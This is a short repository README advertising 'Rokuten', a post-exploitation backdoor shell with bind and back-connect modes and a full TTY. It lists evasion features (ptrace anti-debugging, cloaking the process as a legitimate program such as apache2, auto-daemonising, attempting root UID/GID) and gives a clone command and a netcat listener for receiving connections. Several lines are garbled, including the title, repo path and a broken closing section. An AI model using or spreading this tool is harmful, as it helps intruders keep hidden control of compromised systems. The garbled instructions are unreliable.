# Rokuten always apache2
Rokuten is a post-exploitation shell that includes both a bind and a back connect shell. It creates a fully interactive TTY which allows for job control.

# Image
![Screenshot](https://github.com/2326xxxxxxxxxxxx/739812y-0423894182-4-389ur-31289r63-253-0927u--0/blob/main/300%20years%20Poltava%20battle%20Joker%202.jpeg)
Banner and interaction with shell after a connection is started.

## Features
+ Anti-Debugging, if ptrace is detected as being attached to the shell it will exit.
+ Process Name/Thread names are cloaked, a fake name overwrites all of the system arguments and file name to make it seem like a legitimate program.
+ TTY, a TTY is created which essentially allows for the same usage of the machine as if you were connected via SSH.
+ Bind/Backconnect shell, both a bind shell and back connect can be created.
+ Automatically Daemonizes
+ Tries to set GUID/UID to 0 (root)


## Commands
```bash
$ git clone https://github.com/2326xxxxxxxxxxxx/739812y-0423894182-4-389ur-31289r63-253-0927u--0.git


```
## Example Usage
Backconnect:
```bash
$ nc -lnvp 127.0.0.1 13377
```
## Create Dk&Yk:
+ alaways -O apache2
